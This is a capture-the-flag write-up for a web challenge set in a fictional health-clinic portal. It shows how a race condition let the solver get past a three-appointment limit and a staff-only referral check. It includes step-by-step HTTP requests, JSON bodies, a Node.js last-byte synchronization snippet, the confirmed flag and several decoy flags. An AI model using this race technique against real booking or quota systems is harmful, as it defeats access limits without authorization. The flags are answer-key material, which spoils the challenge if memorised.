# Northbank Health — Appointments & Referrals

## Challenge identity

- **Evidence-backed name:** Northbank Health — Appointments & Referrals, from the portal `<title>`
- **Separate platform-modal title:** Not supplied in the chat
- **URL:** `https://pctf-5-0-yc9z.vercel.app/`
- **Category:** Web Exploitation / business-logic TOCTOU, inferred
- **Points:** Not supplied
- **Status:** **CONFIRMED SOLVED**
- **Confirmed flag:** `pbctf{c0ncurr3nt_4pp34ls_0v3rr4n_th3_thr33_sl0t_l1m1t}`
- **Diagram:** [`diagrams/northbank-race.excalidraw`](diagrams/northbank-race.excalidraw)

## Original question

> Northbank Health runs its patient services online ->>> book a visit, manage your record, collect your paperwork. For most people it works exactly as intended. You are not most people. There is a document the clinic keeps for patients it considers eligible. You are not one of them. The front desk will only tell you that priority referrals are issued by staff -->>>> so one way or another, you'll have to get what staff can. The portal is live at the address provided with this challenge.
>
> https://pctf-5-0-yc9z.vercel.app/

## Confirmed flag

```text
pbctf{c0ncurr3nt_4pp34ls_0v3rr4n_th3_thr33_sl0t_l1m1t}
```

Returned directly by:

```http
GET /api/priority-document
Cookie: nb_session=<valid-session>; nb_role=patient
```

Response:

```json
{"ok":true,"document":"pbctf{c0ncurr3nt_4pp34ls_0v3rr4n_th3_thr33_sl0t_l1m1t}"}
```

The exploit was reproduced twice with fresh sessions. A negative control immediately before the referral race returned:

```json
{"ok":false,"message":"Priority referrals are issued by clinic staff. Please contact the staff desk."}
```

## High-level overview

The visible staff-role cookie was a deliberate trap. The real bug was non-atomic enforcement of a three-active-appointment limit:

```text
fresh patient
→ create six appointments
→ race six appeal requests
→ all six become Confirmed despite the three-slot limit
→ refresh rotating tokens
→ verify priority-document still denies access
→ tightly synchronize six referral requests
→ enough referral updates win
→ priority-document returns the flag
```

The likely vulnerable pattern was:

```text
read current active count
if count < 3:
    mark this appointment Confirmed
```

Concurrent requests observed the same stale pre-update count.

## Discovered API surface

```text
POST   /api/auth/register
POST   /api/auth/login
POST   /api/auth/logout
GET    /api/me
GET    /api/appointments
POST   /api/appointments
DELETE /api/appointments?id=<id>
POST   /api/appointments/appeal
POST   /api/referral/request
GET    /api/priority-document
GET    /api/staff/referrals
```

## Step-by-step exploit

The retained end-to-end implementation is:

```powershell
node "C:\Users\kingg\Documents\codex 2\nb_referral_lastbyte.mjs"
```

### 1. Register a patient

```http
POST /api/auth/register
Content-Type: application/json
```

```json
{
  "name": "Last Byte Patient",
  "email": "last-byte-<unique>@example.com",
  "password": "RacePass123!"
}
```

Capture `nb_session` and use:

```http
Cookie: nb_session=<captured-value>; nb_role=patient
```

No forged staff role is required.

### 2. Create six appointments concurrently

```json
[
  {"specialty":"Primary Care","date":"2026-08-15","time":"09:00"},
  {"specialty":"Diagnostics","date":"2026-08-16","time":"09:30"},
  {"specialty":"Cardiology","date":"2026-08-17","time":"10:00"},
  {"specialty":"Dermatology","date":"2026-08-18","time":"10:30"},
  {"specialty":"Pediatrics","date":"2026-08-19","time":"11:00"},
  {"specialty":"Physiotherapy","date":"2026-08-20","time":"13:00"}
]
```

Post them with `Promise.all` to:

```http
POST /api/appointments
```

### 3. Fetch current IDs and tokens

```http
GET /api/appointments
```

Each record includes:

```text
id
status
referralRequested
token
```

### 4. Race all six appeals

Concurrently send one request per appointment:

```http
POST /api/appointments/appeal
Content-Type: application/json
```

```json
{
  "id": "<appointment-id>",
  "token": "<current-token>"
}
```

Fetch the records again and verify all six are:

```json
{"status":"Confirmed"}
```

### 5. Refresh tokens and run the negative control

Tokens changed during testing, so fetch `/api/appointments` again before requesting referrals.

Then call:

```http
GET /api/priority-document
```

Require the generic denial. Six confirmed appointments alone are not sufficient.

### 6. Synchronize referral requests with a last-byte barrier

Prepare six request bodies:

```json
{
  "id": "<confirmed-appointment-id>",
  "token": "<fresh-token>",
  "padding": "<8192 x characters>"
}
```

Using `node:https`, open six independent requests and write each body except its last byte:

```javascript
const encoded = Buffer.from(JSON.stringify(payload));

req.write(encoded.subarray(0, encoded.length - 1));
await Promise.all(allSixRequestsPrepared);
await delay(800);

for (const pending of allSixRequests) {
  pending.finish(); // req.end(lastByte)
}
```

Endpoint:

```http
POST /api/referral/request
Content-Type: application/json
Content-Length: <exact length>
Connection: close
Cookie: nb_session=<session>; nb_role=patient
```

Holding the final byte forces all handlers to wait for body completion. Releasing the bytes together creates a tighter race than ordinary `Promise.all(fetch(...))`.

All six do not need to win. Four and five successful updates were independently sufficient.

### 7. Retrieve the priority document

```http
GET /api/priority-document
Cookie: nb_session=<session>; nb_role=patient
```

Expected:

```json
{"ok":true,"document":"pbctf{c0ncurr3nt_4pp34ls_0v3rr4n_th3_thr33_sl0t_l1m1t}"}
```

## Skills and workflows used

- `solve-challenge`
- `ctf-web`
- `ctf-web/auth-and-access.md`
- Static HTML and Next.js bundle inspection
- Authenticated API mapping
- Role-cookie and access-control controls
- Token-freshness analysis
- TOCTOU/race testing
- Last-byte request synchronization
- Fresh-session repeat validation

## Tools and services used

- PowerShell
- `curl.exe`
- Node.js native `fetch`
- `node:https`
- `node:timers/promises`
- `Buffer`
- Python `urllib.request`, `urllib.error`, `concurrent.futures`, `pathlib`
- `rg`
- GitHub CLI and web search for negative source discovery
- Vercel-hosted Next.js/Turbopack service

No browser automation was needed for the successful exploit.

## Evidence and controls

- A patient role received `403` from `/api/staff/referrals`.
- Forging `nb_role=staff` did not unlock the real document.
- Three or four appointments were insufficient.
- Six confirmed appointments without referrals were insufficient.
- Sequential referrals were insufficient.
- Ordinary referral `Promise.all` attempts failed.
- IDOR and alternate document paths failed.
- Header injection, mass assignment, prototype pollution, and guessed credentials failed.
- The final endpoint response was obtained twice with fresh sessions.

## Surviving files

```text
C:\Users\kingg\Documents\codex 2\nb_referral_lastbyte.mjs
C:\Users\kingg\Documents\codex 2\nb_referral_race.mjs
C:\Users\kingg\Documents\codex 2\northbank-root\run_referral_phase.py
C:\Users\kingg\Documents\codex 2\northbank-root\probe_idor.py
C:\Users\kingg\Documents\codex 2\northbank-root
```

Historical cookie files contain session material and should be redacted before public release.

## Warning: rejected decoys

Forging `nb_role=staff` exposed:

```text
pbctf{st4ff_r0l3_c00k13_pr1v_3sc_1s_4_tr4p}
```

The user rejected it, and the value labels itself a trap.

Static-source decoys:

```text
pbctf{r0b0ts_wh1sp3r_d34d_3nd}
pbctf{m3t4_t4g_m1r4g3}
pbctf{cl13nt_c0nf1g_d3c0y_2026}
pbctf{v13w_s0urce_1s_n0t_th3_way}
pbctf{d4t4_4ttr_r3d_h3rr1ng}
```
